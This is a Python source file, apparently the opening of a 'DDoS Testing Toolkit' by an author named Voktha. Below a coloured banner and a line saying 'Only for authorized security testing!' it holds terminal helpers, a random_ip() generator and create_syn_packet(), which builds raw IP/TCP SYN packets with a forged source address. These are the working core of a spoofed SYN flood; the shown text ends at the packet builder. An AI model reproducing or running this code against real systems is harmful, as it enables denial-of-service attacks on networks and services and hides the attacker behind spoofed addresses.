import os
import sys
import struct
import random
import socket


class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')


def print_banner():
    banner = f"""
{Colors.BOLD}
{Colors.FAIL}    ██████╗ ███████╗██╗   ██╗██╗██╗     ███████╗███████╗██████╗  ██████╗{Colors.RESET}
{Colors.FAIL}    ██╔══██╗██╔════╝██║   ██║██║██║     ██╔════╝╚══███╔╝██╔══██╗██╔═══██╗{Colors.RESET}
{Colors.FAIL}    ██║  ██║█████╗  ██║   ██║██║██║     █████╗    ███╔╝ ██████╔╝██║   ██║{Colors.RESET}
{Colors.FAIL}    ██║  ██║██╔══╝  ╚██╗ ██╔╝██║██║     ██╔══╝   ███╔╝  ██╔══██╗██║   ██║{Colors.RESET}
{Colors.FAIL}    ██████╔╝███████╗ ╚████╔╝ ██║███████╗███████╗███████╗██║  ██║╚██████╔╝{Colors.RESET}
{Colors.WARNING}    ╚═════╝ ╚══════╝  ╚═══╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝{Colors.RESET}
{Colors.WARNING}                         DDoS Testing Toolkit                         {Colors.RESET}
{Colors.OKBLUE}                     Author: Voktha                                {Colors.RESET}
{Colors.OKBLUE}                     GitHub: github.com/Vokthos                      {Colors.RESET}
{Colors.HEADER}               Only for authorized security testing!                {Colors.RESET}
    """
    print(banner)


def confirm_action(prompt):
    answer = input(f"{Colors.WARNING}{prompt} (Y/n): {Colors.RESET}").strip().lower()
    return answer in ('y', 'yes', '')


def safe_input(prompt, default=None, type_func=str, valid_range=None):
    while True:
        try:
            value = input(f"{Colors.OKCYAN}{prompt}{Colors.RESET}").strip()
            if not value and default is not None:
                return default
            converted = type_func(value)
            if valid_range and converted not in valid_range:
                print(f"{Colors.FAIL}Invalid choice. Allowed: {valid_range}{Colors.RESET}")
                continue
            return converted
        except ValueError:
            print(f"{Colors.FAIL}Invalid input. Try again.{Colors.RESET}")


def print_error(msg):
    print(f"{Colors.FAIL}[!] {msg}{Colors.RESET}")


def print_success(msg):
    print(f"{Colors.OKGREEN}[+] {msg}{Colors.RESET}")


def print_info(msg):
    print(f"{Colors.OKBLUE}[i] {msg}{Colors.RESET}")


def print_warning(msg):
    print(f"{Colors.WARNING}[!] {msg}{Colors.RESET}")


def is_root():
    return os.geteuid() == 0


def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s


def create_syn_packet(source_ip, dest_ip, dest_port):
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 0
    ip_id = random.randint(10000, 65000)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(source_ip)
    ip_daddr = socket.inet_aton(dest_ip)
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    ip_header = struct.pack('!BBHHHBBH4s4s',
        ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
        ip_frag_off, ip_ttl, ip_proto, ip_check,
        ip_saddr, ip_daddr)
    tcp_source = random.randint(1024, 65535)
    tcp_dest = dest_port
    tcp_seq = random.randint(0, 4294967295)
    tcp_ack_seq = 0
    tcp_doff = 5 << 4
    tcp_flags = 0x02
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0
    tcp_header = struct.pack('!HHLLBBHHH',
        tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
        tcp_doff, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
    source_address = socket.inet_aton(source_ip)
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    psh = struct.pack('!4s4sBBH',
        source_address, dest_address,
        placeholder, protocol, tcp_length)
    psh = psh + tcp_header
    tcp_check = checksum(psh)
    tcp_header = struct.pack('!HHLLBBH',
        tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
        tcp_doff, tcp_flags, tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
    return ip_header + tcp_header